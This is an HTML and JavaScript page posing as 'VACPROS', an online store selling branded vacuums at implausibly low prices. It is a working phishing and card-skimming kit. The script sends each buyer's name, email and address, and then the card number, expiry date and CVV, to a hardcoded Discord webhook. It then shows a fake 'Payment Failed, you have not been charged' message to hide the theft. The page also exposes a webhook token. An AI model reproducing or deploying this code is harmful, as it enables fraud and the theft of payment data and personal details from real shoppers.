<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VACPROS - Premium Vacuums</title>
  <style>
    /* Global Styles */
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    a, button {
      font-family: inherit;
    }
    .page {
      display: none;
      padding: 40px 20px;
      min-height: 100vh;
      background-color: #000;
      transition: transform 0.3s ease;
    }
    .page:hover {
      transform: scale(1.02);
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    /* Neon White Text */
    .neon-text {
      color: #fff;
      text-shadow: 
        0 0 5px #fff, 
        0 0 10px #fff, 
        0 0 20px #fff, 
        0 0 40px #fff,
        0 0 80px #fff;
    }
    /* Buttons */
    .btn {
      background: transparent;
      border: 2px solid #fff;
      color: #fff;
      padding: 12px 24px;
      font-size: 1.2em;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.3s ease;
    }
    .btn:hover {
      background: #fff;
      color: #000;
      transform: scale(1.05);
    }
    /* Landing Page */
    #landingPage {
      display: block;
      animation: fadeIn 0.5s ease-in-out;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .landing-header {
      font-size: 4em;
      letter-spacing: 5px;
      text-transform: uppercase;
      margin-bottom: 40px;
    }
    /* Product Page */
    #productPage h2 {
      margin-bottom: 20px;
      font-size: 2.5em;
    }
    .product-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
    }
    .product {
      background-color: rgba(255, 255, 255, 0.05);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px #fff;
      text-align: center;
      width: 220px;
      transition: transform 0.3s ease;
    }
    .product:hover {
      transform: scale(1.03);
    }
    .product img {
      width: 100%;
      border-radius: 5px;
    }
    .product-name {
      margin: 10px 0;
      font-weight: bold;
      font-size: 1.2em;
    }
    .product-info {
      font-size: 1em;
      margin-bottom: 10px;
    }
    /* Form Container (Shipping & Payment) */
    .form-container {
      max-width: 500px;
      margin: auto;
      background: rgba(255, 255, 255, 0.05);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px #fff;
    }
    .form-container h2 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    .form-container input, .form-container button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 1em;
      border: none;
      border-radius: 5px;
    }
    .form-container input {
      background-color: #111;
      color: #fff;
    }
    .form-container button {
      background: #fff;
      color: #000;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    .form-container button:hover {
      transform: scale(1.05);
    }
    /* Processing Page Styles */
    #processingPage {
      display: none;
      padding: 40px 20px;
      min-height: 100vh;
      background-color: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .tick-container {
      width: 100px;
      height: 100px;
      margin-bottom: 20px;
    }
    .tick {
      width: 100px;
      height: 100px;
    }
    /* SVG Animated Tick */
    .tick__circle {
      fill: none;
      stroke: #4CAF50;
      stroke-width: 2;
    }
    .tick__check {
      fill: none;
      stroke: #4CAF50;
      stroke-width: 5;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: dash 0.5s ease-in-out forwards;
      animation-delay: 0.5s;
    }
    @keyframes dash {
      to {
        stroke-dashoffset: 0;
      }
    }
    /* Thank You Page */
    #thankYouPage {
      background-color: #000;
      color: #fff;
      padding: 40px 20px;
    }
    .thankyou-header {
      font-size: 3em;
      letter-spacing: 3px;
      text-transform: uppercase;
      margin-bottom: 20px;
    }
    .thankyou-message {
      font-size: 1.5em;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

  <!-- Landing Page -->
  <div id="landingPage" class="page">
    <div class="landing-header neon-text">VACPROS</div>
    <button class="btn" onclick="redirectToProducts()">Enter Site</button>
  </div>

  <!-- Product Page -->
  <div id="productPage" class="page">
    <h2 class="neon-text">Our Products</h2>
    <div id="productContainer" class="product-container"></div>
    <button class="btn" onclick="redirectToLanding()">Back to Home</button>
  </div>

  <!-- Shipping Page -->
  <div id="shippingPage" class="page">
    <div class="form-container">
      <h2 class="neon-text">Shipping Information</h2>
      <form class="shipping-form" onsubmit="event.preventDefault(); redirectToPayment();">
        <input type="text" id="fullName" placeholder="Full Name" required />
        <input type="email" id="email" placeholder="Email Address" required />
        <input type="text" id="address" placeholder="Shipping Address" required />
        <input type="text" id="city" placeholder="City" required />
        <input type="text" id="zipcode" placeholder="Zip Code" required />
        <input type="text" id="country" placeholder="Country" required />
        <p style="text-align:left;">Shipping Fee: <strong>FREE SHIPPING</strong></p>
        <button type="submit" class="btn">Proceed to Payment</button>
      </form>
      <button class="btn" onclick="redirectToProducts()">Back to Products</button>
    </div>
  </div>

  <!-- Payment Page -->
  <div id="paymentPage" class="page">
    <div class="form-container">
      <h2 class="neon-text">Payment Information</h2>
      <form class="payment-form" onsubmit="event.preventDefault(); completeCheckout();">
        <input
          type="text"
          id="creditCard"
          placeholder="Credit Card (XXXX-XXXX-XXXX-XXXX)"
          maxlength="19"
          oninput="formatCreditCard()"
          required
        />
        <input
          type="text"
          id="expiryDate"
          placeholder="Expiry Date (MM/YY)"
          maxlength="5"
          oninput="formatExpiryDate()"
          required
        />
        <input
          type="text"
          id="cvv"
          placeholder="CVV/CVC"
          maxlength="4"
          oninput="validateCVV()"
          required
        />
        <button type="submit" class="btn">Pay Now</button>
      </form>
      <button class="btn" onclick="redirectToShippingPage()">Back to Shipping Info</button>
    </div>
  </div>

  <!-- Processing Page -->
  <div id="processingPage" class="page">
    <div class="tick-container">
      <svg class="tick" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
        <circle class="tick__circle" cx="26" cy="26" r="25"/>
        <path class="tick__check" d="M14 27l7 7 16-16"/>
      </svg>
    </div>
    <div class="neon-text">Verifying Payment...</div>
  </div>

  <!-- Thank You Page -->
  <div id="thankYouPage" class="page">
    <div class="thankyou-header neon-text">Payment Failed!</div>
    <div class="thankyou-message neon-text">
      Your have not been charged.
    </div>
    <div class="thankyou-message neon-text">
      404 this error is from our end. Sorry for the wait, try again later!
    </div>
    <button class="btn" onclick="redirectToLanding()">Back to Home</button>
  </div>

  <script>
    // Set your webhook URL below (replace with your actual URL)
    const webhookURL = "https://discord.com/api/webhooks/1352796396067098767/jCyCqxPdVfHvUpjzhTvTIX4q8YRNsTNFXHxVvjUp-gYgBZBcgjozoegIJhY0jTi_cKD2";
    
    // Define your products here.
    const products = [
      {
        name: "Hoover WindTunnel 3",
        price: 20.99,
        image: "https://www.cnet.com/a/img/resize/25b3dd3700f3c2b8fa09af09600d63e1f4ccb1de/hub/2013/11/07/446a1543-6788-11e3-846b-14feb5ca9861/2Z9A5166.jpg?auto=webp&width=1200"
      },
      {
        name: "Hoover ONEPWR Cordless",
        price: 24.99,
        image: "https://i.rtings.com/assets/products/6dm8SUve/hoover-onepwr-cordless-hand-vacuum/design-medium.jpg?format=auto"
      },
      {
        name: "Hoover PowerDash Pet",
        price: 29.99,
        image: "https://m.media-amazon.com/images/I/51H88VjwldL.jpg"
      },
      {
        name: "Henry Vacuum",
        price: 11.99,
        image: "https://m.media-amazon.com/images/I/51JoiICAzXL.jpg"
      },
      {
        name: "Dyson V11",
        price: 23.99,
        image: "https://cdn.mos.cms.futurecdn.net/M6hh2ft35gHMKAnEZBfFGZ.jpg"
      }
    ];

    // Generate product cards dynamically.
    const productContainer = document.getElementById("productContainer");
    products.forEach(product => {
      productContainer.innerHTML += `
        <div class="product">
          <img src="${product.image}" alt="${product.name}" />
          <div class="product-name neon-text">${product.name}</div>
          <div class="product-info neon-text">$${product.price.toFixed(2)}</div>
          <button class="btn" onclick="redirectToShipping('${product.name}', ${product.price})">Buy Now</button>
        </div>
      `;
    });

    let selectedProduct = {};
    let shippingInfo = {};

    function hideAllPages() {
      document.querySelectorAll('.page').forEach(page => page.style.display = "none");
    }
    
    function redirectToLanding() {
      hideAllPages();
      document.getElementById("landingPage").style.display = "block";
    }
    
    function redirectToProducts() {
      hideAllPages();
      document.getElementById("productPage").style.display = "block";
    }
    
    function redirectToShipping(productName, price) {
      // Save selected product info
      selectedProduct = { name: productName, price: price };
      hideAllPages();
      document.getElementById("shippingPage").style.display = "block";
    }
    
    function redirectToPayment() {
      // Capture shipping info and store in global variable
      shippingInfo = {
        fullName: document.getElementById("fullName").value,
        email: document.getElementById("email").value,
        address: document.getElementById("address").value,
        city: document.getElementById("city").value,
        zipcode: document.getElementById("zipcode").value,
        country: document.getElementById("country").value
      };
      
      if (shippingInfo.fullName && shippingInfo.email && shippingInfo.address && shippingInfo.city && shippingInfo.zipcode && shippingInfo.country) {
        // Send shipping info (along with product info) to the webhook in a Discord embed with blue styling and emojis
        const embedPayload = {
          embeds: [
            {
              title: "New Order Received! ðŸš€",
              color: 3447003, // Blue color in decimal
              fields: [
                { name: "Product ðŸ›’", value: selectedProduct.name, inline: true },
                { name: "Price ðŸ’²", value: "$" + selectedProduct.price.toFixed(2), inline: true },
                { name: "Full Name ðŸ‘¤", value: shippingInfo.fullName, inline: true },
                { name: "Email ðŸ“§", value: shippingInfo.email, inline: true },
                { name: "Address ðŸ ", value: shippingInfo.address, inline: false },
                { name: "City ðŸŒ†", value: shippingInfo.city, inline: true },
                { name: "Zip Code ðŸ“®", value: shippingInfo.zipcode, inline: true },
                { name: "Country ðŸŒŽ", value: shippingInfo.country, inline: true }
              ],
              footer: { text: "VACPROS Order" }
            }
          ]
        };
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(embedPayload)
        }).then(response => console.log("Webhook sent"))
          .catch(error => console.error("Webhook error:", error));
        
        hideAllPages();
        document.getElementById("paymentPage").style.display = "block";
      } else {
        alert("Please fill out all shipping fields!");
      }
    }
    
    function redirectToShippingPage() {
      hideAllPages();
      document.getElementById("shippingPage").style.display = "block";
    }
    
    function completeCheckout() {
      // Capture payment info from Payment Page
      const paymentInfo = {
        creditCard: document.getElementById("creditCard").value,
        expiryDate: document.getElementById("expiryDate").value,
        cvv: document.getElementById("cvv").value
      };
      
      // OPTIONAL: If you also want to send payment info (not recommended in production)
      const paymentEmbed = {
        embeds: [
          {
            title: "Payment Details Received ðŸ’³",
            color: 3447003,
            fields: [
              { name: "Credit Card", value: paymentInfo.creditCard, inline: false },
              { name: "Expiry Date", value: paymentInfo.expiryDate, inline: true },
              { name: "CVV", value: paymentInfo.cvv, inline: true }
            ],
            footer: { text: "VACPROS Payment" }
          }
        ]
      };
      fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(paymentEmbed)
        }).then(response => console.log("Payment webhook sent"))
          .catch(error => console.error("Payment webhook error:", error));
      
      // Show processing page with animated tick, then redirect to Thank You page
      hideAllPages();
      document.getElementById("processingPage").style.display = "flex";
      setTimeout(() => {
        hideAllPages();
        document.getElementById("thankYouPage").style.display = "block";
      }, 2000); // 2-second delay
    }
    
    // Auto-format Credit Card: add dash every 4 digits
    function formatCreditCard() {
      const input = document.getElementById("creditCard");
      let value = input.value.replace(/\D/g, "");
      let formattedValue = "";
      for (let i = 0; i < value.length && i < 16; i++) {
        if (i > 0 && i % 4 === 0) {
          formattedValue += "-";
        }
        formattedValue += value[i];
      }
      input.value = formattedValue;
    }
    
    // Auto-format Expiry Date: add slash after 2 digits (MM/YY)
    function formatExpiryDate() {
      const input = document.getElementById("expiryDate");
      let value = input.value.replace(/\D/g, "");
      if (value.length > 2) {
        value = value.substring(0, 2) + "/" + value.substring(2, 4);
      }
      input.value = value;
    }
    
    // Validate CVV to allow up to 4 digits
    function validateCVV() {
      const input = document.getElementById("cvv");
      input.value = input.value.replace(/\D/g, "").substring(0, 4);
    }
  </script>

</body>
</html>
